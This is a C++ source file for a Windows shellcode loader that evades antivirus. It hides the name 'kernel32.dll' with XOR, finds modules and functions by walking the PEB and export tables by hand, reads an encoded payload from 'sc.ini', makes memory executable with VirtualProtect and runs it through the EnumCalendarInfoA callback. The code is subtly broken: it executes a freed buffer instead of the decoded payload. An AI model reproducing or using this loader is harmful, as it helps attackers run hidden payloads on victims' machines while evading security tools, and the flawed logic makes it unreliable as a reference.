#define _CRT_SECURE_NO_DEPRECATE
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h>
#include <iostream>
using namespace std;

#pragma comment(lib, "Shlwapi.lib")
#pragma warning(disable:4996)

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
	_wcslwr_s(substr, MAX_PATH);
	_wcslwr_s(mystr, MAX_PATH);

	int result = 0;
	if (StrStrW(mystr, substr) != NULL) {
		result = 1;
	}

	return result;
}

typedef BOOL(WINAPI* EnumInfo)(
	CALINFO_ENUMPROCA	proc,
	LCID				Eocale,
	CALID				Calender,
	CALTYPE				Type
	);

typedef BOOL(WINAPI* Exchange_)(
	LPVOID		lpAddress,
	SIZE_T		DWsIZE,
	DWORD		New,
	PDWORD		Old
	);


typedef UINT(WINAPI* GetfileInt)(
	LPCSTR			LPAPPNAME,
	LPCSTR			KEYNAME,
	INT				DEFINE,
	LPCSTR			FILENAME
	);

// custom implementation
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {

	// obtaining the offset of PPEB from the beginning of TEB
	PEB* pPeb = (PEB*)__readgsqword(0x60);

	// for x86
	// PEB* pPeb = (PEB*)__readgsqword(0x30);

	// obtaining the address of the head node in a linked list 
	// which represents all the models that are loaded into the process.
	PEB_LDR_DATA* Ldr = pPeb->Ldr;
	LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

	// iterating to the next node. this will be our starting point.
	LIST_ENTRY* pStartListEntry = ModuleList->Flink;

	// iterating through the linked list.
	WCHAR mystr[MAX_PATH] = { 0 };
	WCHAR substr[MAX_PATH] = { 0 };
	for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {

		// getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

		// checking if this is the DLL we are looking for
		memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
		memset(substr, 0, MAX_PATH * sizeof(WCHAR));
		wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
		wcscpy_s(substr, MAX_PATH, lModuleName);
		if (cmpUnicodeStr(substr, mystr)) {
			// returning the DLL base address.
			return (HMODULE)pEntry->DllBase;
		}
	}

	// the needed DLL wasn't found
	printf("failed to get a handle to %s\n", (char)lModuleName);
	return NULL;
}

FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
		ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
	WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
	DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

	for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
		if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
			return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
		}
	}

	return NULL;
}

// encrypted module name (kernel32.dll)
char s_dll[] = { 0x1f, 0xd, 0x1b, 0x1d, 0xc, 0x1f, 0x72, 0x46, 0x4b, 0x17, 0x18, 0x18 };

// key
char s_key[] = "thisisAtest";

// XOR decrypt
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

void decode() {
	char buf[3000];
	unsigned int bt[3000];
	CHAR PATH[MAX_PATH];
	GetCurrentDirectoryA(
		MAX_PATH, PATH
	);
	cout << PATH;
	strcat(PATH, "\\sc.ini");
	cout << PATH;

	XOR((char*)s_dll, sizeof(s_dll), s_key, sizeof(s_key));

	wchar_t wtext[20];
	mbstowcs(wtext, s_dll, strlen(s_dll) + 1);
	LPWSTR user_dll = wtext;

	HMODULE mod = myGetModuleHandle(user_dll);
	if (NULL == mod) {
		return ;
	}

	GetfileInt GetFileIntA = (GetfileInt)myGetProcAddress(
		mod, "GetPrivateProfileIntA"
	);
	Exchange_ exchange_ = (Exchange_)myGetProcAddress(
		mod, "VirtualProtect"
	);

	EnumInfo EnumInfoA = (EnumInfo)myGetProcAddress(
		mod, "EnumCalendarInfoA"
	);

	for (int i = 0; i < 3000; i++) {
		_itoa_s(i, buf, 10);
		UINT k = GetFileIntA(
			"key",
			buf, NULL, PATH
		);
		bt[i] = k;
	}
	cout << endl;
	unsigned char* a = (unsigned char*)malloc(sizeof(bt));
	free(a);
	unsigned char* b = (unsigned char*)malloc(sizeof(bt));
	for (int i = 0; i < (sizeof(bt) / sizeof(bt[0])); i++) {
		b[i] = (unsigned char)(bt[i] ^ 1024);
	}
	for (size_t i = 0; i < (sizeof(bt) / sizeof(bt[0])); ++i) {
		std::cout << std::hex << (int)b[i] << " ";
	}
	DWORD p;
	exchange_(
		a, sizeof(a), 0x40, &p
	);
	EnumInfoA(
		(CALINFO_ENUMPROCA)a, LOCALE_SYSTEM_DEFAULT, ENUM_ALL_CALENDARS, CAL_ICALINTVALUE
	);
}

int main(int argc,char* arg[]) {
	decode();
	return 0;
}
